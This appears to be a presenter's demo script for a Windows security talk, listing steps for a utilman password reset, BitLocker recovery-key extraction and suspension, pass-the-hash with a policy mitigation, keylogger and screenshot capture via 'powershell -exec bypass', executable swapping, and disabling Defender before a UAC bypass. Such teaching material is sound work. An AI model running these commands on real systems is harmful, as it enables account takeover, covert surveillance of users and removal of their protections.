#reset local admin - nonbitlockered disk
1. start cl10workgroup
2. show we cannot logon as we dont know the password
3. stop vm
4. mount install media w10 and configure boot order
5. start vm and boot to install media
6. do the hack - utilman
7. restart vm
8. boot to original windows and show utilman hack doesnt work on 19h1
9. hold shift and reboot the windows
10. in start boot options select -> troubleshoot -> advanced opts -> startup settings -> restart
11. press 8 to disable ELAM
12. use the utilman hack and configure local administrator: net user administrator P@ssw0rd /active:yes
13. show we cant see local account and cannot change because this is workgroup computer
14. run taskmgr from hacked cmd and kill logonui
15. sign in as new administrator account

#how to protect - bitlocker - but never be local administrator!
1. start cl10domain
2. show we cannot logon as we dont know the password
3. stop vm
4. mount install media w10 and configure boot order
5. start vm and boot to install media
6. show you cant do the hack as the disk is encypted - "dir C:" and "manage-bde -status"
7. restart - if you cant boot, remove the ISO and restart
8. visualize malware - user is local administrator - why malware to extract keys when we can directly extract the data? we dont know what to extract!
9. we can read Recovery Password:
	Get-BitLockerVolume |select -expa keyprotector |select recoverypassword
10. we can read MVK/FVEK from memory
	BitColdKit
	Passware Recovery Kit Forensic
11. we can set recovery password
	Get-BitLockerVolume -MountPoint C: | Add-BitLockerKeyProtector -RecoveryKeyProtector -RecoveryKeyPath \\server19\files
12. we can suspend the bitlocker and do the hack
	Suspend-Bitlocker -mountpoint C:
13. somehow notify user to reboot so we can start our own winpe and do the hack
14. mount iso and reboot the vm
15. boot to winpe and do some hack
16.??? secure boot ??? we can turn it off using dell/lenovo/hp utilities from running OS!

#pass the hash
1. sign in to CL10WG as localadmin and try \\cl10a\c$ - it wont work
2. sign in to CL10WG as administrator and try \\cl10a\c$ - it will work -> pass-the-hash
3. block on CL10A using group policy editor, under Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights\Assignments\Deny access to this computer from the network, and add one of those new well-known groups.
4. restart CL10A and try the hack from CL10WG again

# we can want to collect volatile data, not offline - for example keystrokes
1. deploy spyware using previous example or via email
2. run keylogger (run as admin file directly) from D: under JAN and show run as admin, run as different user etc.
3. run keylogger from D: under DAN - he's not local admin but its the similar issue
	- powershell exec policy block? fine, at least some protection, but can be avoided
	powershell -exec bypass "& c:\keylogger.ps1"

# we can want to collect volatile data, not offline - for example screenshots
1. deploy startup script for admin users to install our module
2. our module is installed after logon of admin user - jan
	simulate in elevated posh console: install-module cyb3rtools
	simulate we cant use module as the exec policy is blocking it
3. overriden using bypass
	powershell.exe -exec bypass -command "& powershell.exe" -noexit
	ipmo cyb3rtools
	get-command -module cyb3rtools
	Invoke-CRScreenshot -OutputFolder .\
	start . #show bmp
	Invoke-CRScreenshot -OutputFolder .\ -RepetitionDurationSeconds 5 -RepetitionWaitMilliseconds 100 #after that do something on the screen
	start . #show many bmps!

# we can want to collect volatile data, not offline - so we need some apps - we can switch your running apps
1. under jan copy rammap.exe to desktop
2. start it
3. steal 64bit version to documents
4. stop the app
5. move 64bit version to desktop
6. start it
7. do the same for vmmap but dont put the 64bit version back to desktop
8. start rammap64
9. move exe to downloads
10. move vmmap64 to desktop and rename it
11. wait for the user to run our new app ;)

#uac? not for us
1. start procexp
2. select integrity column to show
3. start eventvwr
4. show handles
5. stop AV (optional!!!)
	Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true
6. bypass uac
